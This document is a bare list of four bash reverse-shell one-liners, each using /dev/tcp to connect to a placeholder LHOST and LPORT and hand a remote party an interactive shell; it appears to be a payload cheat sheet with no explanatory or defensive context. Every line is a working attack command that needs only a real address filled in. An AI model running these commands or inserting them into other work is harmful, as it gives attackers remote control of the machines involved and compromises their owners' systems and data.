bash -c 'exec bash -i &>/dev/tcp/LHOST/LPORT <&1'
------------------------------------------------------------------------------
bash -i >& /dev/tcp/LHOST/LPORT 0>&1
------------------------------------------------------------------------------
0<&196;exec 196<>/dev/tcp/LHOST/LPORT; sh <&196 >&196 2>&196
------------------------------------------------------------------------------
exec 5<>/dev/tcp/LHOST/LPORT && while read line 0<&5; do $line 2>&5 >&5; done
